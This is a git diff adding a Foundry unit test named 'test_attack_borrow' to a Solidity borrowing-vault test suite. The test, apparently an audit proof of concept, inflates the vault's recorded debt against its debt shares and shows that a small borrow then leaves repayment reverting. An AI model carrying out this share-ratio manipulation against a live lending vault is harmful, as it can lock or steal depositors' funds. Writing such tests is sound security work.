@@ -11,6 +11,9 @@ import {ILendingProvider} from "../../../src/interfaces/ILendingProvider.sol";
 import {BorrowingVault} from "../../../src/vaults/borrowing/BorrowingVault.sol";
 import {BaseVault} from "../../../src/abstracts/BaseVault.sol";
 
+import {MockERC20} from "../../../src/mocks/MockERC20.sol";
+import 'forge-std/console.sol';
+
 contract VaultUnitTests is MockingSetup, MockRoutines {
   event MinAmountChanged(uint256 newMinAmount);
   event DepositCapChanged(uint256 newDepositCap);
@@ -470,5 +473,30 @@ contract VaultUnitTests is MockingSetup, MockRoutines {
   function test_liquidateInvalidInput() public {
     vm.expectRevert(BorrowingVault.BorrowingVault__liquidate_invalidInput.selector);
     vault.liquidate(ALICE, address(0));
+  }
+
+  function test_attack_borrow() public {
+    // change mintAmount to 1 for easy to describe 
+    bytes memory encodedWithSelectorData = abi.encodeWithSelector(vault.setMinAmount.selector, 1);
+    _callWithTimelock(address(vault), encodedWithSelectorData);
+
+    do_depositAndBorrow(100, 100, vault, ALICE);
+    do_deposit(100, vault, BOB);
+
+    dealMockERC20(debtAsset, address(vault), 100);
+    MockERC20(debtAsset).mintDebt(address(vault), 100, "Mock_V1");
+    
+    assertEq(vault.totalDebt(), 200);
+    assertEq(vault.debtSharesSupply(), 100);
+
+    vm.startPrank(BOB);
+
+    vault.borrow(3, BOB, BOB);
+
+    IERC20(debtAsset).approve(address(vault), 6);
+    vm.expectRevert();
+    vault.payback(6, BOB);
+    
+    vm.stopPrank();
   }
 }
